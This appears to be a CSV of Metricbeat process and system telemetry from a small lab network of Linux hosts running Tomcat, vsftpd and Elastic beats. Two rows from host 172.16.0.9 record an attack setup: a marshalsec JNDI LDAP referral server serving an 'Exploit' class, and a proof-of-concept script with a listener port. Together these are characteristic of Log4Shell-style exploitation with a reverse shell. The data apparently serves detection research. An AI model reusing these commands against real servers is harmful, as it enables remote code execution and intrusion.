@timestamp,agent.type,event.dataset,host.architecture,host.ip,host.os.kernel,host.os.name,host.os.version,metricset.name,process.args,process.cpu.pct,process.executable,process.memory.pct,process.name,process.working_directory,system.process.cmdline,system.process.cpu.total.norm.pct,system.process.cpu.total.pct,system.process.cpu.total.value,system.process.fd.limit.hard,system.process.fd.limit.soft,system.process.memory.rss.bytes,system.process.memory.rss.pct,system.process.memory.share,system.process.memory.size,user.name
"Oct 24, 2022 @ 22:16:57.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"tail, -f, /dev/null",0%,/usr/bin/tail,0%,tail,/,tail -f /dev/null,0%,0%,110,"1,048,576","1,048,576",32KB,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:16:57.137",metricbeat,system.socket.summary,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.135",metricbeat,system.process.summary,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.121",metricbeat,system.memory,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.117",metricbeat,system.load,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:57.114",metricbeat,system.cpu,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.909",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.1%,/usr/share/metricbeat/bin/metricbeat,1.4%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.1%,0.2%,"8,270","1,048,576","1,048,576",54.1MB,1.4%,7.1MB,1.4GB,root
"Oct 24, 2022 @ 22:16:55.909",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0.1%,/usr/share/packetbeat/bin/packetbeat,1.3%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0.1%,0.1%,"5,430","1,048,576","1,048,576",49MB,1.3%,28.6MB,1.4GB,root
"Oct 24, 2022 @ 22:16:55.909",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/bin/sh, -c, rsyslogd; /usr/sbin/sshd -D",0%,/usr/bin/dash,0%,sh,/,/bin/sh -c rsyslogd; /usr/sbin/sshd -D,0%,0%,40,"1,048,576","1,048,576",0B,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:16:55.909",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat-god, -r, /, -n, -p, /var/run/packetbeat.pid, --, /usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0%,/usr/share/packetbeat/bin/packetbeat-god,0%,packetbeat-god,/,/usr/share/packetbeat/bin/packetbeat-god -r / -n -p /var/run/packetbeat.pid -- /usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:16:55.909",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:16:55.909",metricbeat,system.process,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat,0.9%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,"17,760","1,048,576","1,048,576",34.7MB,0.9%,5.5MB,1.4GB,root
"Oct 24, 2022 @ 22:16:55.903",metricbeat,system.network,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.903",metricbeat,system.network,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.903",metricbeat,system.network,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.901",metricbeat,system.socket.summary,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.898",metricbeat,system.process.summary,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.895",metricbeat,system.memory,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.893",metricbeat,system.load,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:55.893",metricbeat,system.cpu,x86_64,172.16.0.4,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.682",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",4%,/usr/share/packetbeat/bin/packetbeat,1.8%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,4%,7.9%,"7,280","1,048,576","1,048,576",69.6MB,1.8%,33.4MB,1.2GB,root
"Oct 24, 2022 @ 22:16:50.682",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.4%,/usr/share/metricbeat/bin/metricbeat,0.8%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.4%,0.8%,"11,770","1,048,576","1,048,576",32.2MB,0.8%,5MB,1.1GB,root
"Oct 24, 2022 @ 22:16:50.682",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java, -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties, -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager, -Djdk.tls.ephemeralDHKeySize=2048, -Djava.endorsed.dirs=/usr/local/tomcat/endorsed, -classpath, /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar, -Dcatalina.base=/usr/local/tomcat, -Dcatalina.home=/usr/local/tomcat, -Djava.io.tmpdir=/usr/local/tomcat/temp, org.apache.catalina.startup.Bootstrap, start",0.4%,/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java,4%,java,/usr/local/tomcat,/usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.endorsed.dirs=/usr/local/tomcat/endorsed -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start,0.4%,0.7%,"16,060","1,048,576","1,048,576",153.5MB,4%,12MB,3.4GB,root
"Oct 24, 2022 @ 22:16:50.682",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0.2%,/usr/share/filebeat/bin/filebeat,1%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0.2%,0.3%,"18,710","1,048,576","1,048,576",36.9MB,1%,9.9MB,1.2GB,root
"Oct 24, 2022 @ 22:16:50.682",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:16:50.682",metricbeat,system.process,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process,/bin/sh,0%,/bin/dash,0%,sh,/usr/local/tomcat,/bin/sh,0%,0%,0,"1,048,576","1,048,576",716KB,0%,628KB,4.2MB,root
"Oct 24, 2022 @ 22:16:50.628",metricbeat,system.process.summary,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.622",metricbeat,system.network,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.622",metricbeat,system.network,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.622",metricbeat,system.network,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.621",metricbeat,system.memory,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.612",metricbeat,system.load,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.597",metricbeat,system.socket.summary,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:50.596",metricbeat,system.cpu,x86_64,172.16.0.2,5.15.0-52-generic,Debian GNU/Linux,8 (jessie),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.277",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",3.5%,/usr/share/packetbeat/bin/packetbeat,1.8%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,3.5%,7%,"6,390","1,048,576","1,048,576",69MB,1.8%,34MB,1.4GB,root
"Oct 24, 2022 @ 22:16:49.277",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.3%,/usr/share/metricbeat/bin/metricbeat,0.9%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.3%,0.5%,"10,640","1,048,576","1,048,576",33.5MB,0.9%,6.9MB,1.4GB,root
"Oct 24, 2022 @ 22:16:49.277",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"tail, -f, /dev/null",0.1%,/usr/bin/tail,0%,tail,/,tail -f /dev/null,0.1%,0.1%,120,"1,048,576","1,048,576",32KB,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:16:49.277",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/home/jdk1.8.0_20/bin/java, -cp, /home/marshalsec-0.0.3-SNAPSHOT-all.jar, marshalsec.jndi.LDAPRefServer, http://172.16.0.9:8000/#Exploit",0.1%,/home/jdk1.8.0_20/bin/java,1.3%,java,/home,/home/jdk1.8.0_20/bin/java -cp /home/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.16.0.9:8000/#Exploit,0.1%,0.1%,"1,310","1,048,576","1,048,576",51.5MB,1.3%,18MB,3.2GB,root
"Oct 24, 2022 @ 22:16:49.277",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0.1%,/usr/share/filebeat/bin/filebeat,0.7%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0.1%,0.1%,"19,400","1,048,576","1,048,576",28.3MB,0.7%,3.6MB,1.5GB,root
"Oct 24, 2022 @ 22:16:49.277",metricbeat,system.process,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"python3, /home/poc.py, --userip, 172.16.0.9, --webport, 8000, --lport, 9001",0%,/usr/bin/python3.10,0.5%,python3,/home,python3 /home/poc.py --userip 172.16.0.9 --webport 8000 --lport 9001,0%,0%,160,"1,048,576","1,048,576",17.8MB,0.5%,8.8MB,96.8MB,root
"Oct 24, 2022 @ 22:16:49.260",metricbeat,system.socket.summary,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.257",metricbeat,system.process.summary,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.255",metricbeat,system.network,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.255",metricbeat,system.network,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.255",metricbeat,system.network,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.250",metricbeat,system.memory,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.249",metricbeat,system.load,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:49.249",metricbeat,system.cpu,x86_64,172.16.0.9,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/metricbeat/bin/metricbeat, -c, /etc/metricbeat/metricbeat.yml, --path.home, /usr/share/metricbeat, --path.config, /etc/metricbeat, --path.data, /var/lib/metricbeat, --path.logs, /var/log/metricbeat",0.2%,/usr/share/metricbeat/bin/metricbeat,0.8%,metricbeat,/,/usr/share/metricbeat/bin/metricbeat -c /etc/metricbeat/metricbeat.yml --path.home /usr/share/metricbeat --path.config /etc/metricbeat --path.data /var/lib/metricbeat --path.logs /var/log/metricbeat,0.2%,0.4%,"12,810","1,048,576","1,048,576",32.6MB,0.8%,5.5MB,1.4GB,root
"Oct 24, 2022 @ 22:16:47.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/packetbeat/bin/packetbeat, -c, /etc/packetbeat/packetbeat.yml, --path.home, /usr/share/packetbeat, --path.config, /etc/packetbeat, --path.data, /var/lib/packetbeat, --path.logs, /var/log/packetbeat",0.1%,/usr/share/packetbeat/bin/packetbeat,1.3%,packetbeat,/,/usr/share/packetbeat/bin/packetbeat -c /etc/packetbeat/packetbeat.yml --path.home /usr/share/packetbeat --path.config /etc/packetbeat --path.data /var/lib/packetbeat --path.logs /var/log/packetbeat,0.1%,0.2%,"4,220","1,048,576","1,048,576",49.2MB,1.3%,29.3MB,1.4GB,root
"Oct 24, 2022 @ 22:16:47.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0.1%,/usr/share/filebeat/bin/filebeat,0.7%,filebeat,/,/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0.1%,0.1%,"19,160","1,048,576","1,048,576",26.1MB,0.7%,2.3MB,1.4GB,root
"Oct 24, 2022 @ 22:16:47.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,/usr/sbin/vsftpd,0%,/usr/sbin/vsftpd,0%,vsftpd,/,/usr/sbin/vsftpd,0%,0%,320,"1,048,576","1,048,576",4KB,0%,0B,9.9MB,root
"Oct 24, 2022 @ 22:16:47.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"/usr/share/filebeat/bin/filebeat-god, -r, /, -n, -p, /var/run/filebeat.pid, --, /usr/share/filebeat/bin/filebeat, -c, /etc/filebeat/filebeat.yml, --path.home, /usr/share/filebeat, --path.config, /etc/filebeat, --path.data, /var/lib/filebeat, --path.logs, /var/log/filebeat",0%,/usr/share/filebeat/bin/filebeat-god,0%,filebeat-god,/,/usr/share/filebeat/bin/filebeat-god -r / -n -p /var/run/filebeat.pid -- /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml --path.home /usr/share/filebeat --path.config /etc/filebeat --path.data /var/lib/filebeat --path.logs /var/log/filebeat,0%,0%,0,"1,048,576","1,048,576",0B,0%,0B,9.1MB,root
"Oct 24, 2022 @ 22:16:47.178",metricbeat,system.process,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process,"tail, -f, /dev/null",0%,/usr/bin/tail,0%,tail,/,tail -f /dev/null,0%,0%,110,"1,048,576","1,048,576",32KB,0%,0B,2.8MB,root
"Oct 24, 2022 @ 22:16:47.138",metricbeat,system.socket.summary,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),socket_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.136",metricbeat,system.process.summary,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),process_summary,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.121",metricbeat,system.network,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),network,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.121",metricbeat,system.memory,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),memory,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.116",metricbeat,system.load,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),load,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
"Oct 24, 2022 @ 22:16:47.115",metricbeat,system.cpu,x86_64,172.16.0.3,5.15.0-52-generic,Ubuntu,22.04.1 LTS (Jammy Jellyfish),cpu,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-
